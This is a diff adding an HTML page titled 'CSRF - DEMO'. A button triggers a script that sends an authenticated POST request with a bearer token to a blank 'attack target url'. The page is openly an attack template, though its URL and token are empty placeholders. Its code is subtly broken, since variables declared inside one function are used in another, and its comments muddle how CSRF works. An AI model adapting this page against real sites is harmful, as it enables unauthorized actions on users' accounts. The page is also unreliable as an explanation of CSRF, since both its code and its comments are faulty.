@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF - DEMO</title>
+  </head>
+
+  <body>
+    <input type="hidden" name="name" value="Universe" />
+    <input type="hidden" name="artistId" value="211" />
+    <button type="button" onclick="process()">Click Me!!</button>
+
+    <script type="text/javascript">
+      async function process() {
+        const url = ""; // Attack target url
+        const token = ""; // Your own token; This token will behave like other authorized user.
+        const response = await doRequestOne();
+
+        console.log("after process done => ", response);
+      }
+
+      const doRequestOne = async () => {
+        const res = await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-type": "application/json",
+            Authorization: `Bearer ${token}`,
+          },
+          body: JSON.stringify({}),
+        });
+
+        return res;
+      };
+    </script>
+  </body>
+</html>
